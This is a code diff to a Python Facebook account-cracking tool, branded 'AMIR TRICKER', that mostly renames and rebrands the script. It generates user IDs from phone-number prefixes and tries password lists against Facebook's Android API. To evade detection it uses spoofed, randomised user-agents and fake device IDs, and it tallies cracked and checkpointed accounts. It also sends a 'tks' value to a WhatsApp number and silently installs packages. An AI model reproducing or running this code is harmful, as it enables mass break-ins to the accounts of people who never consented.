@@ -11,7 +11,7 @@ try:
 except ModuleNotFoundError: 
     print('\n Installing missing modules ...')
     os.system('pip install requests bs4 futures==2 > /dev/null')
-    os.system('python amir1.py')
+    os.system('python AMIR.py')
 	
 os.system('xdg-open https://www.facebook.com/harwinder.singh.921230')
 
@@ -235,17 +235,19 @@ def main_apv():
         os.system('am start https://wa.me/+93 77 313 3076?text=' + tks)        
         
 logo=(f"""{WHITE}
- \033[1;32m.d8b.       .88b  d88.      d888888b      d8888b. 
-\033[1;36md8' `8b      88'YbdP`88        `88'        88  `8D 
-\033[1;37m88ooo88      88  88  88         88         88oobY' 
-\033[1;34m88~~~88      88  88  88         88         88`8b   
-\033[1;36m88   88      88  88  88        .88.        88 `88. 
-\033[1;32mYP   YP      YP  YP  YP      Y888888P      88   YD 
-\033[1;34m------------------------------------------------------💀                                                                   
+       \033[1;32m d8888      888b     d888      8888888      8888888b.  
+       \033[1;32md88888      8888b   d8888        888        888   Y88b 
+     \033[1;33m d88P888      88888b.d88888        888        888    888 
+   \033[1;34m  d88P 888      888Y88888P888        888        888   d88P 
+  \033[1;35m  d88P  888      888 Y888P 888        888        8888888P"  
+  \033[1;34m d88P   888      888  Y8P  888        888        888 T88b   
+  \033[1;33md8888888888      888   "   888        888        888  T88b  
+ \033[1;32md88P     888      888       888      8888888      888   T88b                                                   
+\033[1;35m------------------------------------------------------')                                                                    
 {WHITE}[•] OWNER        :  AMIR TRICKER
 {WHITE}[•] WhatsApp     :  077 313 3076
 [•] FaceBook     :  AMIR KHAN 
-[•] Version      :   {RED}6.1
+[•] Version      :   {RED}1.0
 {WHITE}[•] TOOL STATUS. :  FREE  
 \033[1;32m=====================================================""")
 def linex():
@@ -336,7 +338,7 @@ def menu():
                                 print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                                 linex()
                                 input(' PRESS ENTER TO BACK ')
-                                os.system('python amir1.py')
+                                os.system('python AMIR.py')
                         elif xd in ['2','02']:
                                 pak()
                         elif xd in ['3','03']:
@@ -348,7 +350,7 @@ def menu():
 def pak():
                 user=[]
                 clear()
-                print('\033[1;31m CODE EXAMPLE : 9377,9379,0335,0345')
+                print('\033[1;31m CODE EXAMPLE : 0306,0315,0335,0345')
                 code = input('\033[1;37m PUT CODE: ')
                 try:
                         limit = int(input('\033[1;31m EXAMPLE : 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
@@ -375,7 +377,7 @@ def pak():
                 print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                 linex()
                 input(' PRESS ENTER TO BACK ')
-                os.system('python amir1.py')
+                os.system('python AMIR.py')
 #------
 def ffb(ids,names,passlist):
         try:
@@ -497,7 +499,7 @@ def api(ids,names,passlist):
                         mmmm = random.choice(['Optimus Vu', 'OT-7025D', 'P10 Lite LTE', 'P2', 'P20 Lite', 'P30 Pro (Global)', 'P3400', 'P55 Max', 'P7 Max', 'P8 Lite', 'P9 Lite', 'Pacific 800i', 'Pearl 8100', 'Phoenix 2', 'Phone', 'Pixel', 'Pixel 3', 'Pixel XL', 'Pixi', 'Prada 3.0', 'Pre3', 'Primo GH7', 'Quad EVO Energy 5', 'Quantum 4', 'Radar 4G', 'Radar C110e', 'Realme 2', 'Red Rice', 'Redmi 2', 'Redmi 3', 'Redmi 4', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 5', 'Redmi S2', 'Redmi Y1', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby', 'S4502M', 'S4505M', 'S4702M', 'S580', 'S616', 'S660', 'Sensation', 'SGH-E250', 'SGH-I547', 'SM-G485F', 'Spark', 'Star 3 Duos', 'Storm 9530', 'Stream', 'Stylo 2 Plus (T-Mobile)', 'Stylus 2', 'TM-4377', 'Torch 4G 9810'])
                         cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                         network = random.choice(['Zong','null','Marshmallow','Telekom China'])
-                        ua  = '[FBAN/FB4A;FBAV/60.0.0.16.258;FBBV/20100100;FBDM/({density=2.0,width=720,height=1280};FBLC/en_US;FBCR/T-Mobile;FBMF/Google;FBBD/Pixel;FBPN/com.facebook.katana;FBDV/Nexus 5X;FBSV/8.1.0;nullFBCA/armeabi-v7a;]
+                        ua  = '[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097190;FBDM/({density=1.5,width=480,height=800};FBLC/en_GB;FBCR/O2 - UK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G360F;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]'+'[FBAN/FB4A;FBAV/;FBBV/;[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097190;FBDM/({density=1.5,width=480,height=800};FBLC/en_GB;FBCR/O2 - UK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G360F;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]'+'[FBAN/FB4A;FBAV/;FBBV/;[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097196;FBDM/*{density=4.0,width=1440,eight=2560};FBLC/en_US;FBCR/3.;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/'+mmp+';FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi:;]'
                         random_seed = random.Random()
                         adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                         device_id = str(uuid.uuid4())
@@ -605,7 +607,7 @@ def api1(ids,names,passlist):
                         en = random.choice(['en_US','en_GB'])
                         cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                         network = random.choice(['Zong','null','Marshmallow','Telekom China'])
-                        ua  = "[FBAN/FB4A;FBAV/60.0.0.16.258;FBBV/20100100;FBDM/({density=2.0,width=720,height=1280};FBLC/en_US;FBCR/T-Mobile;FBMF/Google;FBBD/Pixel;FBPN/com.facebook.katana;FBDV/Nexus 5X;FBSV/8.1.0;nullFBCA/armeabi-v7a;]
+                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/;FBBV/;[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM({density=1.0,width=600,height=976};FBLC/es_LA;FBCR/MOVISTAR;FBMF/Rockchip;FBBD/K5-3G;FBPN/com.facebook.katana;FBDV/K5-3G;FBSV/5.1.1;nullFBCA/x86:armeabi-v7a;]"
                         random_seed = random.Random()
                         adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                         device_id = str(uuid.uuid4())
